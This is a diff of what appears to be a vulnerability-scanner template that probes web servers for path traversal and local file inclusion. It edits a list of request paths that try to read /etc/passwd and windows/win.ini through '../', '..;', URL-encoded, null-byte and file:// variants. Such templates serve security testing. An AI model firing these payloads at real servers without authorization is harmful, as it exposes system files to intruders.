@@ -21,10 +21,10 @@ http:
     path:
       - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini"
       - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../etc/passwd"
-      - "{{BaseURL}}/../../../../../../../../../windows/win.ini"
-      - "{{BaseURL}}/../../../../../../../../../etc/passwd"      
-      - "{{BaseURL}}?file=/../../../../../../../../../etc/passwd&url=/../../../../../../../../../etc/passwd"
-      - "{{BaseURL}}?file=/../../../../../../../../../windows/win.ini&url=/../../../../../../../../../windows/win.ini"
+      - "{{BaseURL}}/../../../../../../../../../../../windows/win.ini"
+      - "{{BaseURL}}/../../../../../../../../../../../etc/passwd"      
+      - "{{BaseURL}}?file=../../../../../../../../../../../etc/passwd&url=../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}?file=../../../../../../../../../../windows/win.ini&url=../../../../../../../../../../windows/win.ini"
       - "{{BaseURL}}?file=file:///etc/passwd&url=file:///etc/passwd"      
       - "{{BaseURL}}?file=file:///windows/win.ini&url=file:///windows/win.ini"            
       - "{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini"
@@ -33,10 +33,10 @@ http:
       - "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"            
       - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini%00"
       - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../etc/passwd%00"      
-      - "{{BaseURL}}/../../../../../../../../../windows/win.ini%00"
-      - "{{BaseURL}}/../../../../../../../../../etc/passwd%00"
-      - "{{BaseURL}}/..;/..;/..;/..;/..;/..;/..;/..;/..;/windows/win.ini"
-      - "{{BaseURL}}/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd"         
+      - "{{BaseURL}}/../../../../../../../../../../../windows/win.ini%00"
+      - "{{BaseURL}}/../../../../../../../../../../../etc/passwd%00"
+      - "{{BaseURL}}/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/windows/win.ini"
+      - "{{BaseURL}}/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd"         
       
     stop-at-first-match: true
     matchers-condition: and
